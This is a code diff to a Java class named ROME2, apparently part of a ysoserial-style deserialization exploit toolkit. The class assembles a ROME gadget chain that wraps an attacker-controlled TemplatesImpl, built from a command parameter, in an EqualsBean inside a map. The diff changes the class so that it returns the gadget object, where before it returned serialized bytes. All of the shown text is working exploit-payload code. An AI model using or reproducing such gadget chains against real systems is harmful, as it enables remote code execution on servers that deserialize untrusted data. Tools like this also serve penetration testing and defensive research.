@@ -12,7 +12,7 @@ import java.util.Map;
 
 public class ROME2 implements ObjectPayload<Object> {
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         Object     o    = Gadgets.createTemplatesImpl(type, param);
         EqualsBean bean = new EqualsBean(String.class, "");
 
@@ -25,17 +25,7 @@ public class ROME2 implements ObjectPayload<Object> {
         Reflections.setFieldValue(bean, "_beanClass", Templates.class);
         Reflections.setFieldValue(bean, "_obj", o);
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(Gadgets.makeMap(map1, map2));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return Gadgets.makeMap(map1, map2);
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
-    }
 }
